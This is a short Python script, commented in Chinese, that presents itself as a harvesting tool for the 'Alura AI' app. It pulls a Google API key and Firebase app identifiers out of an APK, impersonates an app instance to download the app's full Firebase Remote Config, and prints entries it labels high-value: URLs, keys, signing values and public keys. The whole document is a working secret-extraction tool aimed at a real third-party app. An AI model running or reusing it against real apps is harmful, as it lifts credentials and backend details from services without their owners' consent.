#!/usr/bin/env python3
"""
Alura AI — Remote Config 全量收割 + 上游密钥提取工具
用法: python fetch_remote_config.py [apk_path 或 ai_api_key]
默认从 APK 中自动提取 Firebase 凭证 (AIza key / project number / mobilesdk_app_id)。
"""
import base64, json, re, sys, zipfile, urllib.request, ssl

RC_URL = "https://firebaseremoteconfig.googleapis.com/v1/projects/{proj}/namespaces/firebase:fetch?key={key}"

def creds_from_apk(apk):
    aiya, appid, proj = None, None, None
    with zipfile.ZipFile(apk) as z:
        for name in ("resources.arsc",):
            data = z.read(name)
            m = re.search(rb'AIza[0-9A-Za-z_-]{30,}', data)
            if m: aiya = m.group().decode()
        m2 = re.search(rb'1:(\d{8,}):android:([a-f0-9]+)', data)
        if m2: appid = m2.group().decode(); proj = m2.group(1).decode()
    return aiya, appid, proj

def fetch(aiya, appid, proj):
    body = json.dumps({"app_id": appid,
                       "app_instance_id": "4E1F6B8C0A9D2E3F4A5B6C7D8E9F0A1B",
                       "app_version": "157", "sdk_version": "23.2.0"}).encode()
    req = urllib.request.Request(RC_URL.format(proj=proj, key=aiya), data=body,
                                 headers={"Content-Type": "application/json"})
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read())

if __name__ == "__main__":
    apk = sys.argv[1] if len(sys.argv) > 1 else None
    if not apk:
        print(__doc__); sys.exit(1)
    aiya, appid, proj = creds_from_apk(apk)
    print(f"API key: {aiya}\napp_id:  {appid}\nproject: {proj}")
    d = fetch(aiya, appid, proj)
    entries = d.get("entries", {})
    print(f"entries: {len(entries)} (state={d.get('state')})")
    out = apk.rsplit("/", 1)[-1].replace(".apk", "") + "_remote_config.json"
    json.dump(d, open(out, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    print("saved →", out)
    # 高价值键打印
    for k, v in sorted(entries.items()):
        if re.search(r'url|key|link|base|edit|fetch|sign|pubkey|app_name|demo', k, re.I):
            print(f"  {k} = {str(v)[:120]}")
